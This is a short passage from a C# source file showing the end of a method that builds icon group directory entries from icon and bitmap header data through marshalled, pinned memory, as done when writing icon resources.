                        Marshal.SizeOf(typeof(BITMAPINFOHEADER)));
                    pinnedBitmapInfoHeader.Free();
                    grpEntry.Width = iconEntry[i].Width;
                    grpEntry.Height = iconEntry[i].Height;
                    grpEntry.ColorCount = iconEntry[i].ColorCount;
                    grpEntry.Reserved = iconEntry[i].Reserved;
                    grpEntry.Planes = bitmapheader.Planes;
                    grpEntry.BitCount = bitmapheader.BitCount;
                    grpEntry.BytesInRes = iconEntry[i].BytesInRes;
                    grpEntry.ID = Convert.ToUInt16(iconBaseID + i);
                    Marshal.StructureToPtr(grpEntry, new IntPtr(pinnedData.AddrOfPinnedObject().ToInt64() + offset),
                        false);
                    offset += Marshal.SizeOf(typeof(GRPICONDIRENTRY));
                }
                pinnedData.Free();
                return data;
            }
        }
    }
}
